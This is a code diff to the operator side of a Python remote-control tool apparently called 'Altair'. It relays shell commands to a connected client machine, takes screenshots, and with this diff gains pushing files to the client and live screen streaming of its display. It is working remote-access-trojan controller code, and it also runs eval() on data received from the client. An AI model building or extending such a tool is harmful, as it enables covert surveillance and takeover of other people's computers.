@@ -1,6 +1,8 @@
 from getpass import getuser
-from time import sleep
+from time import sleep, time
 from util import versionControl,Console,AltairCommandList
+from threading import Thread
+from vidstream import StreamingServer
 import os
 import sys
 import socket
@@ -106,16 +108,20 @@ class Server(socket.socket):
                     elif c == "":
                         print(f"{Console.CYAN}\t      ╰──/{Console.YELLOW}Please No Epmty")
                     else:
-                        client_socket.send(c.encode())
-                        resp = eval(client_socket.recv(4096).decode())
-                        byte = ""
-                        for i,j in resp.items():
-                            byte += i
-                        resp_ = client_socket.recv(1024 if int(byte)<1024 else int(byte)).decode()
-                        if resp_ == "exited":
+                        try:
+                            client_socket.send(c.encode())
+                            resp = eval(client_socket.recv(4096).decode())
+                            byte = ""
+                            for i,j in resp.items():
+                                byte += i
+                            resp_ = client_socket.recv(1024 if int(byte)<1024 else int(byte)).decode()
+                            if resp_ == "exited":
+                                break
+                            else:
+                                print("\n".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{x}".expandtabs(7) for x in resp_.split("\n")))
+                                print(byte)
+                        except NameError:
                             break
-                        else:
-                            print("\n".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{x}".expandtabs(7) for x in resp_.split("\n")))
 
             elif _input == AltairCommandList.SS:
                 client_socket.send(AltairCommandList.SS.encode())
@@ -138,8 +144,7 @@ class Server(socket.socket):
                         recv_cmd = client_socket.recv(1024).decode()
                         if recv_cmd == "exited":
                             break
-                        print(f"{recv_cmd}")
-
+                        print(recv_cmd)
 
             elif _input == AltairCommandList.INFO:
                 client_socket.send(AltairCommandList.INFO.encode())
@@ -170,8 +175,33 @@ class Server(socket.socket):
                     elif i == "n":
                         break
 
-            elif _input == AltairCommandList.EXIT:
+            elif _input.startswith(AltairCommandList.SEND_FILE):
                 client_socket.send(_input.encode())
+                splt = _input.split()
+                if len(splt) == 2:
+                    client_socket.send(splt[1].encode())
+                    a = time()
+                    with open(os.path.abspath(splt[1].strip()),"rb") as file:
+                        data = file.read()
+                        data_lenght = len(data)
+                        client_socket.send(data_lenght.to_bytes(4,'big'))
+                        client_socket.send(data)
+                    b = time()
+                print(f"\t{Console.CYAN}╰──/The '{splt[1]}' File was sent in {(b-a).__round__(3)} seconds.".expandtabs(7))
+
+            elif _input == AltairCommandList.SCREEN_RECORD:
+                try:
+                    print(f"\t{Console.CYAN}╰──/X to exit".expandtabs(7))
+                    client_socket.send(AltairCommandList.SCREEN_RECORD.encode())
+                    self.close()
+                    screen = StreamingServer(host=ip,port=port,quit_key="x")
+                    t1 = Thread(target=screen.start_server,daemon=True)
+                    t1.start()
+                except:
+                    pass
+
+            elif _input == AltairCommandList.EXIT:
+                client_socket.send(AltairCommandList.EXIT.encode())
                 print(f"{Console.YELLOW}[SERVER]~Lost connection with Altair")
                 return self.terminalUsing()
             
@@ -181,12 +211,7 @@ class Server(socket.socket):
 def main():
     try:
         Server()
-    except ConnectionResetError:
-        print("Bağlantı Kaybedildi!")
-        main()
-    except ConnectionAbortedError:
-        print("Bağlantı kaybedildi")
-        main()
-
+    except:
+        pass
 if __name__ == "__main__":
     main()
